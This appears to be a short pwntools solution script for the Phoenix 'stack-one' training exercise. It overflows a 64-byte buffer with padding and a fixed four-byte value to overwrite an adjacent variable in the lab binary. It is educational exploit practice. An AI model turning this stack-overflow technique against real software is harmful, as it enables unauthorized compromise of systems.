from pwn import *

buf = ("A" * 64 + "\x62\x59\x6c\x49")

p = process(['/opt/phoenix/i486/stack-one', buf])

p.interactive()
